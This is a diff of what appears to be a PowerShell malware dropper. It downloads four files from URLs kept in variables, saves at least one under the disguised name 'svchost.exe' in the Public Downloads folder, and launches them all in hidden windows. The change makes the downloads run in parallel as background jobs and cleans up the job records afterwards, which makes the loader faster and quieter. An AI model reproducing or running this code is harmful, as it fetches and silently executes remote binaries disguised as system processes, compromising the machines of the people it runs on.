@@ -25,13 +25,19 @@ $locations = @(
     'C:\Users\Public\Downloads\svchost.exe'
 )
 
-Invoke-WebRequest -Uri $url1 -OutFile $locations[0]
-Invoke-WebRequest -Uri $url2 -OutFile $locations[1]
-Invoke-WebRequest -Uri $url3 -OutFile $locations[2]
-Invoke-WebRequest -Uri $url4 -OutFile $locations[3]
+Invoke-WebRequest -Uri $url1 -OutFile $locations[0] -AsJob
+Invoke-WebRequest -Uri $url2 -OutFile $locations[1] -AsJob
+Invoke-WebRequest -Uri $url3 -OutFile $locations[2] -AsJob
+Invoke-WebRequest -Uri $url4 -OutFile $locations[3] -AsJob
 
-foreach ($location in $locations) {
-    Start-Process -FilePath $location -WindowStyle Hidden -Wait
-}
+Wait-Job -Job (Get-Job)
+
+Start-Process -FilePath $locations[0] -WindowStyle Hidden
+Start-Process -FilePath $locations[1] -WindowStyle Hidden
+Start-Process -FilePath $locations[2] -WindowStyle Hidden
+Start-Process -FilePath $locations[3] -WindowStyle Hidden
+
+Remove-Job -Job (Get-Job)
+
 
 
